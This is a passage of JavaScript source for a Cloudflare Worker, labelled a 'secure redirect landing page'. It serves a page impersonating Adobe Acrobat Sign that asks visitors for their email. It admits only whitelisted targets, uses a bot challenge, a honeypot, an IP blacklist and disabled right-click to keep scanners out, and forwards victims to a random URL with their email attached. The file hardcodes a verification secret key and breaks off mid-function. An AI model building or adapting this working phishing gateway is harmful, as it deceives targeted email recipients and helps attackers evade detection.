// Cloudflare Worker for secure redirect landing page - OPTIMIZED FOR LARGE DATASETS
export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const path = url.pathname;

    // Handle CORS preflight requests
    if (request.method === 'OPTIONS') {
      return new Response(null, {
        status: 200,
        headers: {
          'Access-Control-Allow-Origin': '*',
          'Access-Control-Allow-Methods': 'POST, GET, OPTIONS',
          'Access-Control-Allow-Headers': 'Content-Type',
        },
      });
    }

    // Rate limiting check
    const rateLimitResult = await checkRateLimit(request, env);
    if (!rateLimitResult.allowed) {
      return new Response(JSON.stringify({ 
        success: false, 
        message: 'Too many requests. Please try again later.' 
      }), {
        status: 429,
        headers: { 'Content-Type': 'application/json' }
      });
    }

    // Serve static files
    if (path === '/' || path === '/index.html') {
      return serveStaticFile('index.html');
    }

    if (path === '/styles.css') {
      return serveStaticFile('styles.css');
    }

    if (path === '/script.js') {
      return serveStaticFile('script.js');
    }

    // API endpoints
    if (path === '/api/validate') {
      return handleValidation(request, env);
    }

    // 404 for unknown routes
    return new Response('Not Found', { status: 404 });
  },
};

// Rate limiting function
async function checkRateLimit(request, env) {
  const clientIP = request.headers.get('CF-Connecting-IP') || 
                  request.headers.get('X-Forwarded-For') || 
                  'unknown';
  
  const maxRequests = parseInt(env.RATE_LIMIT_MAX_REQUESTS || '10');
  const windowSeconds = parseInt(env.RATE_LIMIT_WINDOW || '60');
  const now = Math.floor(Date.now() / 1000);
  const windowStart = now - windowSeconds;
  
  const key = `rate_limit:${clientIP}`;
  
  try {
    // Get current requests from KV
    const currentData = await env.RATE_LIMIT_KV.get(key, { type: 'json' });
    const requests = currentData ? currentData.requests.filter(timestamp => timestamp > windowStart) : [];
    
    if (requests.length >= maxRequests) {
      return { allowed: false, remaining: 0 };
    }
    
    // Add current request
    requests.push(now);
    
    // Store updated data with TTL
    await env.RATE_LIMIT_KV.put(key, JSON.stringify({ requests }), {
      expirationTtl: windowSeconds + 60 // Add 1 minute buffer
    });
    
    return { 
      allowed: true, 
      remaining: maxRequests - requests.length 
    };
  } catch (error) {
    console.error('Rate limiting error:', error);
    // Allow request if rate limiting fails
    return { allowed: true, remaining: 1 };
  }
}

// Optimized caching function with TTL
async function getCachedData(key, env) {
  try {
    const cacheKey = `cache:${key}`;
    const cached = await env.RATE_LIMIT_KV.get(cacheKey, { type: 'json' });
    
    if (cached && cached.timestamp) {
      const ttl = parseInt(env.CACHE_TTL || '300'); // 5 minutes default
      const now = Date.now();
      
      if (now - cached.timestamp < ttl * 1000) {
        console.log(`Cache hit for key: ${key}`);
        return cached.data;
      }
    }
    
    return null;
  } catch (error) {
    console.error('Cache error:', error);
    return null;
  }
}

// Set cached data with TTL
async function setCachedData(key, data, env) {
  try {
    const cacheKey = `cache:${key}`;
    const ttl = parseInt(env.CACHE_TTL || '300');
    
    await env.RATE_LIMIT_KV.put(cacheKey, JSON.stringify({
      data,
      timestamp: Date.now()
    }), {
      expirationTtl: ttl + 60 // Add 1 minute buffer
    });
    
    console.log(`Cached data for key: ${key}`);
  } catch (error) {
    console.error('Cache set error:', error);
  }
}

async function handleValidation(request, env) {
  try {
    // Only allow POST requests
    if (request.method !== 'POST') {
      return new Response('Method Not Allowed', { status: 405 });
    }

    const clientIP = request.headers.get('CF-Connecting-IP') || 
                    request.headers.get('X-Forwarded-For') || 
                    'unknown';

    const body = await request.json();
    const { email, turnstileToken, honeypotField } = body;

    // Honeypot field validation
    if (honeypotField && honeypotField.trim() !== '') {
      console.log(`Honeypot field filled by IP: ${clientIP}`);
      return new Response(JSON.stringify({ 
        success: false, 
        message: 'Access denied' 
      }), {
        status: 403,
        headers: { 'Content-Type': 'application/json' }
      });
    }

    if (!email || !turnstileToken) {
      return new Response(JSON.stringify({ 
        success: false, 
        message: 'Missing required fields' 
      }), {
        status: 400,
        headers: { 'Content-Type': 'application/json' }
      });
    }

    // Basic email validation
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
      return new Response(JSON.stringify({ 
        success: false, 
        message: 'Invalid email format' 
      }), {
        status: 400,
        headers: { 'Content-Type': 'application/json' }
      });
    }

    // Verify Turnstile token
    const turnstileValid = await verifyTurnstile(turnstileToken, clientIP);
    if (!turnstileValid) {
      console.log(`Invalid Turnstile token for IP: ${clientIP}`);
      return new Response(JSON.stringify({ 
        success: false, 
        message: 'Verification failed. Please complete the challenge and try again.' 
      }), {
        status: 400,
        headers: { 'Content-Type': 'application/json' }
      });
    }

    // Check blacklist first
    const blacklist = await getBlacklist(env);
    if (blacklist.includes(clientIP)) {
      console.log(`Blocked blacklisted IP: ${clientIP}`);
      return new Response(JSON.stringify({ 
        success: false, 
        message: 'Access denied' 
      }), {
        status: 403,
        headers: { 'Content-Type': 'application/json' }
      });
    }

    // OPTIMIZED: Check if email is in whitelist using Set for O(1) lookup
    const whitelistSet = await getWhitelistSet(env);
    const emailToCheck = email.toLowerCase();
    const isWhitelisted = whitelistSet.has(emailToCheck);
    
    console.log(`Email check: "${emailToCheck}" - Whitelist size: ${whitelistSet.size} - Found: ${isWhitelisted}`);

    if (!isWhitelisted) {
      console.log(`Unauthorized access attempt - IP: ${clientIP}, Email: ${email}`);
      return new Response(JSON.stringify({ 
        success: false, 
        message: 'Sorry, this email isn\'t associated with this secure link' 
      }), {
        status: 403,
        headers: { 'Content-Type': 'application/json' }
      });
    }

    // Get random redirect URL
    const redirectUrl = await getRandomRedirectUrl(env);
    if (!redirectUrl) {
      return new Response(JSON.stringify({ 
        success: false, 
        message: 'No redirect URLs available' 
      }), {
        status: 500,
        headers: { 'Content-Type': 'application/json' }
      });
    }

    // Append email to redirect URL
    const finalUrl = `${redirectUrl}${email}`;

    console.log(`Successful redirect - IP: ${clientIP}, Email: ${email}, URL: ${finalUrl}`);

    return new Response(JSON.stringify({ 
      success: true, 
      redirectUrl: finalUrl 
    }), {
      status: 200,
      headers: { 'Content-Type': 'application/json' }
    });

  } catch (error) {
    console.error('Validation error:', error);
    return new Response(JSON.stringify({ 
      success: false, 
      message: 'Internal server error' 
    }), {
      status: 500,
      headers: { 'Content-Type': 'application/json' }
    });
  }
}

async function verifyTurnstile(token, clientIP) {
  try {
    if (!token) {
      console.error('No Turnstile token provided');
      return false;
    }

    const formData = new FormData();
    formData.append('secret', '0x4AAAAAABnne_hupg_rDmo4SEAkns3Hl2Y');
    formData.append('response', token);
    formData.append('remoteip', clientIP);

    const response = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
      method: 'POST',
      body: formData,
    });

    const result = await response.json();
    
    if (!result.success) {
      console.error('Turnstile verification failed:', result);
    }
    
    return result.success;
  } catch (error) {
    console.error('Turnstile verification error:', error);
    return false;
  }
}

async function getBlacklist(env) {
  try {
    // Check cache first
    const cached = await getCachedData('blacklist', env);
    if (cached) return cached;

    // Try multiple approaches for loading blacklist
    let blacklist = [];
    
    // Method 1: Try GitHub API with raw content
    try {
      const headers = {
        'User-Agent': 'Secure-Redirect-Worker/1.0',
        'Accept': 'application/vnd.github.v3.raw'
      };

      if (env.GITHUB_API_TOKEN) {
        headers['Authorization'] = `token ${env.GITHUB_API_TOKEN}`;
      }

      const response = await fetch(
        `https://api.github.com/repos/${env.GITHUB_REPO_OWNER}/${env.GITHUB_REPO_NAME}/contents/data/blacklist.txt?ref=${env.GITHUB_BRANCH}`,
        { headers }
      );

      if (response.ok) {
        const data = await response.json();
        const content = atob(data.content);
        blacklist = content.split('\n').filter(ip => ip.trim() !== '');
        console.log(`Method 1 success: Loaded ${blacklist.length} IPs from GitHub API`);
      } else {
        console.log(`Method 1 failed: ${response.status} ${response.statusText}`);
      }
    } catch (error) {
      console.error('Method 1 error:', error);
    }

    // Method 2: Try raw.githubusercontent.com if Method 1 failed
    if (blacklist.length === 0) {
      try {
        const response = await fetch(
          `https://raw.githubusercontent.com/${env.GITHUB_REPO_OWNER}/${env.GITHUB_REPO_NAME}/${env.GITHUB_BRANCH}/data/blacklist.txt`
        );

        if (response.ok) {
          const content = await response.text();
          blacklist = content.split('\n').filter(ip => ip.trim() !== '');
          console.log(`Method 2 success: Loaded ${blacklist.length} IPs from raw.githubusercontent.com`);
        } else {
          console.log(`Method 2 failed: ${response.status} ${response.statusText}`);
        }
      } catch (error) {
        console.error('Method 2 error:', error);
      }
    }

    // Cache the result
    if (blacklist.length > 0) {
      await setCachedData('blacklist', blacklist, env);
      console.log(`Cached ${blacklist.length} IPs for future requests`);
    } else {
      console.log('No blacklist entries found or all methods failed');
    }
    
    return blacklist;
  } catch (error) {
    console.error('Error fetching blacklist:', error);
    return [];
  }
}

// OPTIMIZED: Get whitelist as Set for O(1) lookup performance
async function getWhitelistSet(env) {
  try {
    // Check cache first
    const cached = await getCachedData('whitelist_set', env);
    if (cached) {
      console.log(`Cache hit: Loaded ${cached.length} emails from cache`);
      return new Set(cached);
    }

    // Try multiple approaches for large files
    let emails = [];
    
    // Method 1: Try GitHub API with raw content
    try {
      const headers = {
        'User-Agent': 'Secure-Redirect-Worker/1.0',
        'Accept': 'application/vnd.github.v3.raw'
      };

      if (env.GITHUB_API_TOKEN) {
        headers['Authorization'] = `token ${env.GITHUB_API_TOKEN}`;
      }

      const response = await fetch(
        `https://api.github.com/repos/${env.GITHUB_REPO_OWNER}/${env.GITHUB_REPO_NAME}/contents/data/list.json?ref=${env.GITHUB_BRANCH}`,
        { headers }
      );

      if (response.ok) {
        const data = await response.json();
        const content = atob(data.content);
        const jsonData = JSON.parse(content);
        emails = (jsonData.emails || []).map(email => email.toLowerCase());
        console.log(`Method 1 success: Loaded ${emails.length} emails from GitHub API`);
      } else {
        console.log(`Method 1 failed: ${response.status} ${response.statusText}`);
      }
    } catch (error) {
      console.error('Method 1 error:', error);
    }

    // Method 2: Try raw.githubusercontent.com if Method 1 failed
    if (emails.length === 0) {
      try {
        const response = await fetch(
          `https://raw.githubusercontent.com/${env.GITHUB_REPO_OWNER}/${env.GITHUB_REPO_NAME}/${env.GITHUB_BRANCH}/data/list.json`
        );

        if (response.ok) {
          const jsonData = await response.json();
          emails = (jsonData.emails || []).map(email => email.toLowerCase());
          console.log(`Method 2 success: Loaded ${emails.length} emails from raw.githubusercontent.com`);
        } else {
          console.log(`Method 2 failed: ${response.status} ${response.statusText}`);
        }
      } catch (error) {
        console.error('Method 2 error:', error);
      }
    }

    // Method 3: Try text file approach if JSON is too large
    if (emails.length === 0) {
      try {
        const response = await fetch(
          `https://raw.githubusercontent.com/${env.GITHUB_REPO_OWNER}/${env.GITHUB_REPO_NAME}/${env.GITHUB_BRANCH}/data/emails.txt`
        );

        if (response.ok) {
          const text = await response.text();
          emails = text.split('\n')
            .map(line => line.trim())
            .filter(email => email && email.includes('@'))
            .map(email => email.toLowerCase());
          console.log(`Method 3 success: Loaded ${emails.length} emails from text file`);
        } else {
          console.log(`Method 3 failed: ${response.status} ${response.statusText}`);
        }
      } catch (error) {
        console.error('Method 3 error:', error);
      }
    }

    // Convert to Set for O(1) lookup
    const whitelistSet = new Set(emails);
    
    // Cache the result as array (Set can't be serialized)
    if (emails.length > 0) {
      await setCachedData('whitelist_set', emails, env);
      console.log(`Cached ${whitelistSet.size} emails for future requests`);
    } else {
      console.error('All methods failed to load emails');
    }
    
    return whitelistSet;
  } catch (error) {
    console.error('Error fetching whitelist:', error);
    return new Set();
  }
}

// Legacy function for backward compatibility
async function getWhitelist(env) {
  const whitelistSet = await getWhitelistSet(env);
  return Array.from(whitelistSet);
}

async function getRandomRedirectUrl(env) {
  try {
    // Check cache first
    const cached = await getCachedData('redirect_urls', env);
    if (cached) {
      const urls = cached;
      if (urls.length === 0) return null;
      const randomIndex = Math.floor(Math.random() * urls.length);
      return urls[randomIndex];
    }

    // Try multiple approaches for loading URLs
    let urls = [];
    
    // Method 1: Try GitHub API with raw content
    try {
      const headers = {
        'User-Agent': 'Secure-Redirect-Worker/1.0',
        'Accept': 'application/vnd.github.v3.raw'
      };

      if (env.GITHUB_API_TOKEN) {
        headers['Authorization'] = `token ${env.GITHUB_API_TOKEN}`;
      }

      const response = await fetch(
        `https://api.github.com/repos/${env.GITHUB_REPO_OWNER}/${env.GITHUB_REPO_NAME}/contents/data/url.json?ref=${env.GITHUB_BRANCH}`,
        { headers }
      );

      if (response.ok) {
        const data = await response.json();
        const content = atob(data.content);
        const jsonData = JSON.parse(content);
        urls = jsonData.urls || [];
        console.log(`Method 1 success: Loaded ${urls.length} URLs from GitHub API`);
      } else {
        console.log(`Method 1 failed: ${response.status} ${response.statusText}`);
      }
    } catch (error) {
      console.error('Method 1 error:', error);
    }

    // Method 2: Try raw.githubusercontent.com if Method 1 failed
    if (urls.length === 0) {
      try {
        const response = await fetch(
          `https://raw.githubusercontent.com/${env.GITHUB_REPO_OWNER}/${env.GITHUB_REPO_NAME}/${env.GITHUB_BRANCH}/data/url.json`
        );

        if (response.ok) {
          const jsonData = await response.json();
          urls = jsonData.urls || [];
          console.log(`Method 2 success: Loaded ${urls.length} URLs from raw.githubusercontent.com`);
        } else {
          console.log(`Method 2 failed: ${response.status} ${response.statusText}`);
        }
      } catch (error) {
        console.error('Method 2 error:', error);
      }
    }

    // Method 3: Try text file approach if JSON is too large
    if (urls.length === 0) {
      try {
        const response = await fetch(
          `https://raw.githubusercontent.com/${env.GITHUB_REPO_OWNER}/${env.GITHUB_REPO_NAME}/${env.GITHUB_BRANCH}/data/urls.txt`
        );

        if (response.ok) {
          const text = await response.text();
          urls = text.split('\n')
            .map(line => line.trim())
            .filter(url => url && url.startsWith('http'));
          console.log(`Method 3 success: Loaded ${urls.length} URLs from text file`);
        } else {
          console.log(`Method 3 failed: ${response.status} ${response.statusText}`);
        }
      } catch (error) {
        console.error('Method 3 error:', error);
      }
    }

    // Cache the result
    if (urls.length > 0) {
      await setCachedData('redirect_urls', urls, env);
      console.log(`Cached ${urls.length} URLs for future requests`);
    } else {
      console.error('All methods failed to load redirect URLs');
    }
    
    if (urls.length === 0) return null;
    
    const randomIndex = Math.floor(Math.random() * urls.length);
    return urls[randomIndex];
  } catch (error) {
    console.error('Error fetching redirect URLs:', error);
    return null;
  }
}

async function serveStaticFile(filename) {
  const files = {
    'index.html': `<!DOCTYPE html>
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Before we continue...</title>
    <link rel="icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAACXBIWXMAAAsTAAALEwEAmpwYAAABjUlEQVR4nO2XOywEURiFP6/Q2Eh2KWxJlJLtvDqPSkOho5RQWjQKSgnRLqVHJ6EnEhWNSEgUXo2IQihQkIhHJhmyGTNn7tydTRR7kr+ac8//zcy9d+5ASf9EdcCRYWVETiZCjtPzVyngy6CugXKCVQZcGGalbACmCNd0sQDegAYDACfrtRgA65hroxgAnREAuuIGOCO6TuMEGLMAGI8L4AVIWADUAk9xAORCNh61MeXiAMiIBivAsrjeWijAQcgjfjZ4RYeFAAwbTjI1SUdsAR6AGhF8nOc9Eb5q4N4GYEGEdvj424V/MSrAJ9AiAtd8AleFvwn4iAKwI8KSAR8b52NVL8btRgEYEEFZsbQmxLhBU4A7oEocOM4FwKXr8VMlcGsCMCvuokc0/6luMX4uDOAdSIuANmDUU48egE0xPu32CATYIrqWPABOg0bh31YAvRYAze6yzYeYEf6+IICrkBOv0p4H4AaoCJnIfwCy2GvIZzL2C/+kFyDhbjC2cpbtvufHY174k5aHnJKIXd8y0FiwJ5MhSAAAAABJRU5ErkJggg==" type="image/png">
    <script type="module" crossorigin="" src=""></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/igun89/css@main/index-9eef6c26.css">
  </head>
  <body>
         <div id="app" data-v-app=""><div class="background"><!----><div data-v-527512fb="" class="adobe-sign-container"><div data-v-527512fb="" class="sign-card"><div class="header" data-v-527512fb=""><div class="logo-text" data-v-527512fb=""><span class="person-icon" data-v-527512fb="">⼈</span> Adobe Acrobat Sign </div><img class="adobe-logo" src="https://i.postimg.cc/Dw1H51KD/email-adobe-sign-logo-3-2x.png" alt="Adobe Logo" data-v-527512fb=""></div><div class="success-check" data-v-527512fb="">✓</div><div data-v-527512fb="" class="content"><p data-v-527512fb=""><strong data-v-527512fb="">Verify the intended recipient's email.</strong></p><p data-v-527512fb="">Enter the email address to which this item was shared to sign your document.</p><input data-v-527512fb="" type="email" placeholder="Enter email" required="" id="email-input"><!----></div><button data-v-527512fb="" id="continue-button">OPEN</button><div id="turnstile-container" style="display: none; margin: 20px 0; text-align: center;"><div id="turnstile-widget" data-sitekey="0x4AAAAAABnnez0Dy-TkLp3r"></div></div><div data-v-527512fb="" class="divider"></div><p data-v-527512fb="" class="footer-text"> Attached is the final agreement for your reference. Read it with <a data-v-527512fb="" href="#">Acrobat Reader</a>. You can also <a data-v-527512fb="" href="#">open it online</a> to review its activity history. </p></div><div data-v-527512fb="" class="global-footer"><p data-v-527512fb=""><strong data-v-527512fb="">Powered by</strong></p><img data-v-527512fb="" class="footer-logo" src="https://i.postimg.cc/L65myCyW/email-adobe-tag-classic-2x.png" alt="Adobe Sign Logo"><p data-v-527512fb="">Need your own documents signed? Adobe Acrobat Sign can help save you time. <a data-v-527512fb="" href="#">Learn more</a>.</p><p data-v-527512fb="">To ensure that you continue receiving our emails, please add adobesign@adobesign.com to your address book.</p><p data-v-527512fb="">Terms of Use | Report Abuse</p><p data-v-527512fb="">© 2025 Adobe. All rights reserved.</p></div></div></div></div>
    
    <!-- Honeypot field -->
    <input type="text" id="honeypotField" class="honeypot-field" name="honeypot" autocomplete="off" style="position: absolute; left: -9999px; width: 1px; height: 1px; opacity: 0;">
    
    <!-- Message display -->
    <div id="message" class="message" style="display: none; margin-top: 15px; padding: 10px; border-radius: 5px; font-size: 14px; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; border: 1px solid #ccc; box-shadow: 0 2px 10px rgba(0,0,0,0.1); z-index: 1000; min-width: 200px; text-align: center;"></div>
    
    <style>
        .message.success {
            background-color: #d4edda !important;
            color: #155724 !important;
            border: 1px solid #c3e6cb !important;
        }
        
        .message.error {
            background-color: #f8d7da !important;
            color: #721c24 !important;
            border: 1px solid #f5c6cb !important;
        }
        
        #email-input.error {
            border: 2px solid #dc3545 !important;
            animation: shake 0.5s ease-in-out;
        }
        
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }
    </style>

<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
<script>
    // Disable right-click
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
    });

    // Main application logic
    class SecureRedirectApp {
        constructor() {
            this.form = document.querySelector('.sign-card');
            this.emailInput = document.getElementById('email-input');
            this.submitBtn = document.getElementById('continue-button');
            this.messageDiv = document.getElementById('message');
            this.turnstileContainer = document.getElementById('turnstile-container');
            this.turnstileWidget = null;
            this.turnstileRendered = false;
            this.step = 1; // 1 = email input, 2 = turnstile verification
            
            this.init();
        }
        
        init() {
            this.setupEventListeners();
        }
        
        setupEventListeners() {
            this.submitBtn.addEventListener('click', (e) => this.handleSubmit(e));
            this.emailInput.addEventListener('input', () => this.clearError());
        }
        
        setupTurnstile() {
            // Wait for Turnstile to load
            const checkTurnstile = () => {
                if (window.turnstile && !this.turnstileRendered) {
                    try {
                        this.turnstileWidget = window.turnstile.render('#turnstile-widget', {
                            sitekey: '0x4AAAAAABnnez0Dy-TkLp3r',
                            callback: (token) => {
                                this.onTurnstileSuccess(token);
                            },
                            'expired-callback': () => {
                                this.onTurnstileExpired();
                            },
                            'error-callback': () => {
                                console.error('Turnstile error occurred');
                                this.showError('Verification failed. Please try again.');
                            }
                        });
                        this.turnstileRendered = true;
                        console.log('Turnstile widget rendered successfully');
                    } catch (error) {
                        console.error('Error rendering Turnstile widget:', error);
                        this.showError('Failed to load verification. Please refresh the page.');
                    }
                } else if (!window.turnstile) {
                    setTimeout(checkTurnstile, 100);
                }
            };
            
            checkTurnstile();
        }
        
        onTurnstileSuccess(token) {
            console.log('Turnstile validation successful');
            // Proceed with final validation
            this.performFinalValidation();
        }
        
        onTurnstileExpired() {
            console.log('Turnstile validation expired');
            this.showError('Verification expired. Please try again.');
        }
        
        async handleSubmit(e) {
            e.preventDefault();
            
            const email = this.emailInput.value.trim();
            
            // Basic email check
            if (!email || email.trim() === '') {
                this.showError('Please enter an email address.');
                return;
            }
            
            if (this.step === 1) {
                // First step: Show Turnstile
                this.step = 2;
                this.turnstileContainer.style.display = 'block';
                this.submitBtn.textContent = 'Verifying...';
                this.submitBtn.disabled = true;
                this.setupTurnstile();
            }
        }
        
        async performFinalValidation() {
            const email = this.emailInput.value.trim();
            const honeypotField = document.getElementById('honeypotField').value;
            
            this.setLoading(true);
            
            try {
                const response = await fetch('/api/validate', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        email: email,
                        turnstileToken: window.turnstile.getResponse(),
                        honeypotField: honeypotField
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    this.showMessage('Redirecting...', 'success');
                    setTimeout(() => {
                        window.location.href = data.redirectUrl;
                    }, 1000);
                } else {
                    this.showError(data.message || 'Access denied.');
                    // Reset to step 1
                    this.resetToStep1();
                }
            } catch (error) {
                console.error('Error:', error);
                this.showError('An error occurred. Please try again.');
                // Reset to step 1
                this.resetToStep1();
            } finally {
                this.setLoading(false);
            }
        }
        
        resetToStep1() {
            this.step = 1;
            this.turnstileContainer.style.display = 'none';
            this.submitBtn.textContent = 'OPEN';
            this.submitBtn.disabled = false;
            if (this.turnstileWidget && window.turnstile) {
                window.turnstile.reset();
            }
        }
        
        showError(message) {
            this.emailInput.classList.add('error');
            this.showMessage(message, 'error');
            
            // Remove error class after animation
            setTimeout(() => {
                this.emailInput.classList.remove('error');
            }, 500);
        }
        
        clearError() {
            this.emailInput.classList.remove('error');
            this.hideMessage();
        }
        
        showMessage(message, type = 'success') {
            this.messageDiv.textContent = message;
            this.messageDiv.className = \`message \${type}\`;
            this.messageDiv.style.display = 'block';
            
            // Auto-hide success messages
            if (type === 'success') {
                setTimeout(() => {
                    this.hideMessage();
                }, 3000);
            }
        }
        
        hideMessage() {
            this.messageDiv.style.display = 'none';
        }
        
        setLoading(loading) {
            if (loading) {
                this.submitBtn.textContent = 'Processing...';
                this.submitBtn.disabled = true;
            } else {
                if (this.step === 1) {
                    this.submitBtn.textContent = 'OPEN';
                    this.submitBtn.disabled = false;
                } else {
                    this.submitBtn.textContent = 'Verifying...';
                    this.submitBtn.disabled = true;
                }
            }
        }
    }

    // Initialize the app when DOM is loaded
    document.addEventListener('DOMContentLoaded', () => {
        new SecureRedirectApp();
    });
</script>
</body></html>`,
    'styles.css': `/* Reset and base styles */
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

:root {
    --primary-color: #667eea;
    --secondary-color: #764ba2;
    --text-color: #2c3e50;
    --text-secondary: #7f8c8d;
    --background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    --card-bg: rgba(255, 255, 255, 0.95);
    --border-color: #e1e8ed;
    --success-color: #27ae60;
    --error-color: #e74c3c;
    --font-size: 16px;
    --border-radius: 12px;
    --transition: all 0.3s ease;
}

body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background: var(--background);
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
    font-size: var(--font-size);
    color: var(--text-color);
    transition: var(--transition);
}

.container {
    width: 100%;
    max-width: 400px;
    animation: fadeIn 0.6s ease-out;
}

.card {
    background: var(--card-bg);
    backdrop-filter: blur(10px);
    border-radius: 20px;
    padding: 40px 30px;
    box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
    border: 1px solid var(--border-color);
    transition: var(--transition);
}

.header {
    text-align: center;
    margin-bottom: 30px;
}

.header h1 {
    color: var(--text-color);
    font-size: 28px;
    font-weight: 600;
    margin-bottom: 10px;
    transition: var(--transition);
}

.header p {
    color: var(--text-secondary);
    font-size: 16px;
    transition: var(--transition);
}

.email-form {
    display: flex;
    flex-direction: column;
    gap: 20px;
}

.input-group {
    display: flex;
    flex-direction: column;
    gap: 15px;
}

#emailInput {
    width: 100%;
    padding: 15px 20px;
    border: 2px solid var(--border-color);
    border-radius: var(--border-radius);
    font-size: var(--font-size);
    transition: var(--transition);
    background: var(--card-bg);
    color: var(--text-color);
}

#emailInput:focus {
    outline: none;
    border-color: var(--primary-color);
    box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
}

#emailInput.error {
    border-color: var(--error-color);
    animation: shake 0.5s ease-in-out;
}

.turnstile-container {
    display: flex;
    justify-content: center;
    margin: 10px 0;
}

.submit-btn {
    width: 100%;
    padding: 15px 20px;
    background: linear-gradient(135deg, var(--primary-color) 0%, var(--secondary-color) 100%);
    color: white;
    border: none;
    border-radius: var(--border-radius);
    font-size: var(--font-size);
    font-weight: 600;
    cursor: pointer;
    transition: var(--transition);
    position: relative;
    overflow: hidden;
}

.submit-btn:hover {
    transform: translateY(-2px);
    box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
}

.submit-btn:active {
    transform: translateY(0);
}

.submit-btn:disabled {
    opacity: 0.7;
    cursor: not-allowed;
    transform: none;
}

.message {
    margin-top: 20px;
    padding: 15px;
    border-radius: 10px;
    text-align: center;
    font-weight: 500;
    transition: var(--transition);
}

.message.success {
    background: rgba(46, 204, 113, 0.1);
    color: var(--success-color);
    border: 1px solid rgba(46, 204, 113, 0.3);
}

.message.error {
    background: rgba(231, 76, 60, 0.1);
    color: var(--error-color);
    border: 1px solid rgba(231, 76, 60, 0.3);
}

/* Animations */
@keyframes fadeIn {
    from {
        opacity: 0;
        transform: translateY(20px);
    }
    to {
        opacity: 1;
        transform: translateY(0);
    }
}

@keyframes shake {
    0%, 100% { transform: translateX(0); }
    25% { transform: translateX(-5px); }
    75% { transform: translateX(5px); }
}

/* Mobile responsiveness */
@media (max-width: 480px) {
    .card {
        padding: 30px 20px;
    }
    
    .header h1 {
        font-size: 24px;
    }
    
    .header p {
        font-size: 14px;
    }
}`,
    'script.js': `// Main application logic
class SecureRedirectApp {
    constructor() {
        this.form = document.getElementById('emailForm');
        this.emailInput = document.getElementById('emailInput');
        this.submitBtn = document.getElementById('continue-button');
        this.messageDiv = document.getElementById('message');
        this.turnstileWidget = null;
        
        this.init();
    }
    
    init() {
        this.setupEventListeners();
        this.setupTurnstile();
    }
    
    setupEventListeners() {
        this.form.addEventListener('submit', (e) => this.handleSubmit(e));
        this.emailInput.addEventListener('input', () => this.clearError());
    }
    
    setupTurnstile() {
        // Wait for Turnstile to load
        const checkTurnstile = () => {
            if (window.turnstile) {
                try {
                    this.turnstileWidget = window.turnstile.render('.cf-turnstile', {
                        sitekey: '0x4AAAAAABnnez0Dy-TkLp3r',
                        callback: (token) => {
                            this.onTurnstileSuccess(token);
                        },
                        'expired-callback': () => {
                            this.onTurnstileExpired();
                        },
                        'error-callback': () => {
                            console.error('Turnstile error occurred');
                            this.showError('Verification failed. Please try again.');
                        }
                    });
                    console.log('Turnstile widget rendered successfully');
                } catch (error) {
                    console.error('Error rendering Turnstile widget:', error);
                    this.showError('Failed to load verification. Please refresh the page.');
                }
            } else {
                setTimeout(checkTurnstile, 100);
            }
        };
        
        checkTurnstile();
    }
    
    onTurnstileSuccess(token) {
        console.log('Turnstile validation successful');
        // Enable the submit button
        this.submitBtn.disabled = false;
        this.submitBtn.style.opacity = '1';
    }
    
    onTurnstileExpired() {
        console.log('Turnstile validation expired');
        // Disable the submit button
        this.submitBtn.disabled = true;
        this.submitBtn.style.opacity = '0.7';
        this.showError('Verification expired. Please try again.');
    }
    
    async handleSubmit(e) {
        e.preventDefault();
        
        const email = this.emailInput.value.trim();
        const honeypotField = document.getElementById('honeypotField').value;
        
        // Basic email check - let server handle detailed validation
        if (!email || email.trim() === '') {
            this.showError('Please enter an email address.');
            return;
        }
        
        // Check if Turnstile is completed
        if (!window.turnstile || !window.turnstile.getResponse()) {
            this.showError('Please complete the verification.');
            return;
        }
        
        this.setLoading(true);
        
        try {
            const response = await fetch('/api/validate', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    email: email,
                    turnstileToken: window.turnstile.getResponse(),
                    honeypotField: honeypotField
                })
            });
            
            const data = await response.json();
            
            if (data.success) {
                this.showMessage('Redirecting...', 'success');
                setTimeout(() => {
                    window.location.href = data.redirectUrl;
                }, 1000);
            } else {
                this.showError(data.message || 'Access denied.');
                // Reset Turnstile on error
                if (window.turnstile) {
                    window.turnstile.reset();
                }
            }
        } catch (error) {
            console.error('Error:', error);
            this.showError('An error occurred. Please try again.');
            // Reset Turnstile on error
            if (window.turnstile) {
                window.turnstile.reset();
            }
        } finally {
            this.setLoading(false);
        }
    }
    
    showError(message) {
        this.emailInput.classList.add('error');
        this.showMessage(message, 'error');
        
        // Remove error class after animation
        setTimeout(() => {
            this.emailInput.classList.remove('error');
        }, 500);
    }
    
    clearError() {
        this.emailInput.classList.remove('error');
        this.hideMessage();
    }
    
    showMessage(message, type = 'success') {
        this.messageDiv.textContent = message;
        this.messageDiv.className = \`message \${type}\`;
        this.messageDiv.style.display = 'block';
        
        // Auto-hide success messages
        if (type === 'success') {
            setTimeout(() => {
                this.hideMessage();
            }, 3000);
        }
    }
    
    hideMessage() {
        this.messageDiv.style.display = 'none';
    }
    
    setLoading(loading) {
        const btnText = this.submitBtn.querySelector('.btn-text');
        const btnLoading = this.submitBtn.querySelector('.btn-loading');
        
        if (loading) {
            btnText.style.display = 'none';
